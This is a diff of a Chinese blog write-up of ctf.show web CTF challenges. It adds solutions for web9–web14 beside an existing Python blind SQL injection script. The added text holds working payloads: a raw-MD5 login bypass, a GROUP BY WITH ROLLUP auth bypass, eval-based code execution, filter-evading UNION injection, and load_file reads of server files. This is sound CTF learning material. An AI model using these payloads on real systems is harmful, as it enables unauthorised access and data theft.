@@ -112,7 +112,22 @@
 <meta property="og:image" content="f:/n0va/themes/next/source/images/web/22.jpg">
 <meta property="og:image" content="f:/n0va/themes/next/source/images/web/21.jpg">
 <meta property="og:image" content="f:/n0va/themes/next/source/images/web/23.jpg">
-<meta property="og:updated_time" content="2020-12-28T15:20:30.289Z">
+<meta property="og:image" content="f:/n0va/themes/next/source/images/web/24.jpg">
+<meta property="og:image" content="f:/n0va/themes/next/source/images/web/25.jpg">
+<meta property="og:image" content="f:/n0va/themes/next/source/images/web/26.jpg">
+<meta property="og:image" content="f:/n0va/themes/next/source/images/web/27.jpg">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407133301905.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407140418187.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407140710654.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407140842964.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407201251523.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407201326378.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407201447493.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407201440691.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407202832955.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407203146256.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210407203327902.png">
+<meta property="og:updated_time" content="2021-04-09T08:01:25.252Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ctf.show web">
 <meta name="twitter:description" content="web1 – 签到签到 F12 -&amp;gt; base64">
@@ -417,7 +432,85 @@
 <p>将<code>substr(string,1,1)</code>改为<code>substr(string from 1 for 1)</code></p>
 <p>python 脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://57595e6b-d1f5-470b-80ca-dbd58def5906.chall.ctf.show/index.php?id=-1/**/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span><span class="params">(url)</span>:</span></span><br><span class="line">	database = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">		<span class="keyword">print</span> i</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">			u = <span class="string">"||/**/ascii(substr(database()/**/from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;"</span>.format(i,j)</span><br><span class="line">			s = url+u</span><br><span class="line">			<span class="comment"># print s</span></span><br><span class="line">			r = requests.get(s)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'By Rudyard Kipling'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				database += chr(j)</span><br><span class="line">				<span class="keyword">print</span> database</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line"><span class="comment"># db(url)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table</span><span class="params">(url)</span>:</span></span><br><span class="line">	table = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">		<span class="keyword">print</span> i</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">			u = <span class="string">"||/**/ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;"</span>.format(i,j)</span><br><span class="line">			<span class="comment"># u = "or/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)/**/from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;".format(i,j)</span></span><br><span class="line">			s = url+u</span><br><span class="line">			r = requests.get(s)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'By Rudyard Kipling'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				table += chr(j)</span><br><span class="line">				<span class="keyword">print</span> table</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line"><span class="comment"># table(url)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column</span><span class="params">(url)</span>:</span></span><br><span class="line">	column = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">		<span class="keyword">print</span> i</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">			u = <span class="string">'||/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name="flag"/**/limit/**/1/**/offset/**/0)/**/from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;'</span>.format(i,j)</span><br><span class="line">			s = url+u</span><br><span class="line">			r = requests.get(s)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'By Rudyard Kipling'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				column += chr(j)</span><br><span class="line">				<span class="keyword">print</span> column</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line"><span class="comment"># column(url)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(url)</span>:</span></span><br><span class="line">	flag = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">		<span class="keyword">print</span> i</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">			u = <span class="string">"||/**/ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/1/**/offset/**/0)/**/from/**/&#123;0&#125;/**/for/**/1))=&#123;1&#125;"</span>.format(i,j)</span><br><span class="line">			s = url+u</span><br><span class="line">			r = requests.get(s)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'By Rudyard Kipling'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				flag += chr(j)</span><br><span class="line">				<span class="keyword">print</span> flag</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">get_flag(url)</span><br></pre></td></tr></table></figure>
-
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>尝试简单的万能密码以及过滤绕过，均没有回显；猜测存在其他页面，直接后台扫描目录，得到<code>robots.txt</code>(御剑扫不出，字典原因吧；这里用dirsearch扫出来的)</p>
+<p><img src="F:\n0va\themes\next\source\images\web\24.jpg" alt="24"></p>
+<p><code>rebots.txt</code>是用来告诉爬虫有什么网页是不能爬的，算是一个君子协议吧，但是听不听就不知道了，我显然是不听的；所以得到了index.phps</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $flag=<span class="string">""</span>;</span><br><span class="line">		$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">		<span class="keyword">if</span>(strlen($password)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"password error"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=<span class="string">"select * from user where username ='admin' and password ='"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">"登陆成功&lt;br&gt;"</span>;</span><br><span class="line">						 <span class="keyword">echo</span> $flag;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对于函数md5(string,raw)<br>第二个参数有以下可选项：<br>TRUE - 原始16字符二进制格式<br>FALSE - 默认，32字符十六进制数<br>所以只要md5加密后的16进制转化为二进制时有<code>&#39;or&#39; xxx</code>，即可构成闭合语句:<code>username = &#39;admin&#39; and password = &#39;&#39;or&#39;xxx&#39;</code>成功登录</p>
+<p>这里给出两个字符串<br>ffifdyop<br>129581926211651571912466741651878684928<br>因为字符长度受限，所以输入<code>ffifdyop</code>即可得到flag</p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>打开页面点击取消按钮，拿到源码。</p>
+<p>源码中将注入可能用到的关键词都过滤得差不多了；另外，通过下面的if语句使用无法使用双写绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"sql inject error"</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>这里介绍两个sql语句</p>
+<p>1、<code>group by</code>(将结果集中的数据行根据选择列的值进行逻辑分组)</p>
+<p>不加<code>group by</code>时的输出：</p>
+<p><img src="F:\n0va\themes\next\source\images\web\25.jpg" alt="25"></p>
+<p>在使用<code>group by</code>以后会按照<code>password</code>中的值进行排列：</p>
+<p><img src="F:\n0va\themes\next\source\images\web\26.jpg" alt="26"></p>
+<p>2、<code>with rollup</code>(group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计)</p>
+<p><img src="F:\n0va\themes\next\source\images\web\27.jpg" alt="27"></p>
+<p>count(*)为统计和</p>
+<p>通过这两个我们就可以通过骚姿势绕过了。</p>
+<p><code>payload:username=&#39;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password&#39;</code></p>
+<p>因为加入 with rollup后password第一行为NULL，我们只需要输入空密码即可使得<code>$password==$row[&#39;password&#39;]</code>(<code>NULL==NULL</code>)；登录成功</p>
+<blockquote>
+<p>根据数据库的不同，若通过group by xxx with rollup未能使得第一行为NULL，则无法满足$password==$row[‘password’] (NULL==NULL)</p>
+</blockquote>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>​    <img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407133301905.png" alt="image-20210407133301905"></p>
+<p>跟web10很像，不过这题出flag的条件是<code>$password==$_SESSION[&#39;password&#39;]</code>,password由我们输入，session中的password存储在本地，所以这里我们输入空密码，并且将本地的session删除即可成功绕过拿到flag。</p>
+<blockquote>
+<p>什么是session：</p>
+<p>session是另一种记录客户状态的机制，它是在服务器上面，客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是session。客户端浏览器再次访问时只需要从该session中查找客户的状态就可以了。</p>
+<p>参考：<a href="https://www.cnblogs.com/l199616j/p/11195667.html" target="_blank" rel="noopener">https://www.cnblogs.com/l199616j/p/11195667.html</a></p>
+</blockquote>
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>打开站点，没有注入的地址，查看源码提示：<code>&lt;!-- hit:?cmd= --&gt;</code></p>
+<p>在网站上输入<code>?cmd=phpinfo();</code>有回显，猜测源码中应该为<code>eval($_GET[&#39;cmd&#39;]);</code></p>
+<p>在eval执行漏洞中我们可以查看网页的源代码。</p>
+<p><code>?cmd=highlight_file(&quot;index.php&quot;);</code>，成功回显源码。</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407140418187.png" alt="image-20210407140418187"></p>
+<blockquote>
+<p>这里再介绍一个php的函数glob();</p>
+<p>glob()函数返回匹配指定模式的文件名或者目录；</p>
+<p>glob(“*”)匹配任意文件</p>
+<p>glob(“*.txt”)匹配txt后缀的文件</p>
+</blockquote>
+<p>于是我们输入<code>?cmd=print_r(glob(&quot;*&quot;));</code>打印出了如下文件</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407140710654.png" alt="image-20210407140710654"></p>
+<p>接着用<code>highlight_file();</code>读取名字很长的文件，拿到flag</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407140842964.png" alt="image-20210407140842964"></p>
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>打开页面可以看到源码，switch case语句。case语句中，如果有break则不会执行下面的case，如果没有则会执行直到遇上break或者结束。</p>
+<p>题目中还有一条限制<code>sleep($c);</code>也就是我们输入的c是多少就会睡眠多少秒然后再执行。所以要输出<code>$url</code>就得找到一个小的case。case 3下好合适。</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407201251523.png" alt="image-20210407201251523"></p>
+<p>输入<code>?c=3</code>回显</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407201326378.png" alt="image-20210407201326378"></p>
+<p>接下来访问<code>here_1s_your_f1ag.php</code>页面。</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407201447493.png" alt="image-20210407201447493"></p>
+<p>应该是注入，但是网站源代码有提示，过滤了关键词<code>information_schema.tables,information_schema.columns,linesting,空格,polygon</code>；</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407201440691.png" alt="image-20210407201440691"></p>
+<p>绕过方法：反引号</p>
+<blockquote>
+<p>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号。</p>
+</blockquote>
+<p>例如：information_schema.tables和information_schema.`tables`都可以使用。</p>
+<p>网页的弹窗使得我们不容易观察，我们直接在源代码页面进行注入。</p>
+<p><code>view-source:http://44cbb734-a21a-4be3-8f2c-374245771e2c.challenge.ctf.show:8080/here_1s_your_f1ag.php</code></p>
+<p>爆库名：(web)</p>
+<p><code>?query=-1/**/union/**/select/**/database()</code></p>
+<p>爆表名：(content)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure>
+<p>爆字段名：(id,username,password)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&apos;content&apos;</span><br></pre></td></tr></table></figure>
+<p>爆值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content</span><br></pre></td></tr></table></figure>
+<p>到这并没有拿到我们想要的flag，但是拿到下面的提示</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407202832955.png" alt="image-20210407202832955"></p>
+<p>所以很有可能flag在secret.php中，现在就有一个问题，我们怎么从数据库中查看文件内容呢，mysql提供了读取本地文件的函数<code>load_file()</code>，所以构造语句：</p>
+<p><code>?query=-1/**/union/**/select/**/load_file(&#39;/var/www/html/secret.php&#39;)</code></p>
+<p>得到</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407203146256.png" alt="image-20210407203146256"></p>
+<p>也就是说<code>/tmp/gtfly</code>中的内容为’ctf.show’时输出’/real_flag_is_here’中的内容，所以我们直接读’/real_flag_is_here’即可拿到flag。</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210407203327902.png" alt="image-20210407203327902"></p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2>
         
       </div>
       
@@ -486,7 +579,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">50</span>
+                  <span class="site-state-item-count">52</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -586,7 +679,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-–-签到"><span class="nav-number">1.</span> <span class="nav-text">web1 – 签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-–-最简单的SQL注入"><span class="nav-number">2.</span> <span class="nav-text">web2 – 最简单的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一：手工注入"><span class="nav-number">2.1.</span> <span class="nav-text">方法一：手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#手工注入常用语句"><span class="nav-number">2.1.1.</span> <span class="nav-text">手工注入常用语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二：sqlmap注入"><span class="nav-number">2.2.</span> <span class="nav-text">方法二：sqlmap注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3-–-更简单的web题"><span class="nav-number">3.</span> <span class="nav-text">web3 – 更简单的web题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">4.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">5.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">7.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">8.</span> <span class="nav-text">web8</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-–-签到"><span class="nav-number">1.</span> <span class="nav-text">web1 – 签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-–-最简单的SQL注入"><span class="nav-number">2.</span> <span class="nav-text">web2 – 最简单的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一：手工注入"><span class="nav-number">2.1.</span> <span class="nav-text">方法一：手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#手工注入常用语句"><span class="nav-number">2.1.1.</span> <span class="nav-text">手工注入常用语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二：sqlmap注入"><span class="nav-number">2.2.</span> <span class="nav-text">方法二：sqlmap注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3-–-更简单的web题"><span class="nav-number">3.</span> <span class="nav-text">web3 – 更简单的web题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">4.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">5.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">7.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">8.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web9"><span class="nav-number">9.</span> <span class="nav-text">web9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web10"><span class="nav-number">10.</span> <span class="nav-text">web10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web11"><span class="nav-number">11.</span> <span class="nav-text">web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web12"><span class="nav-number">12.</span> <span class="nav-text">web12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web13"><span class="nav-number">13.</span> <span class="nav-text">web13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web14"><span class="nav-number">14.</span> <span class="nav-text">web14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web15"><span class="nav-number">15.</span> <span class="nav-text">web15</span></a></li></ol></div>
             
 
           </div>
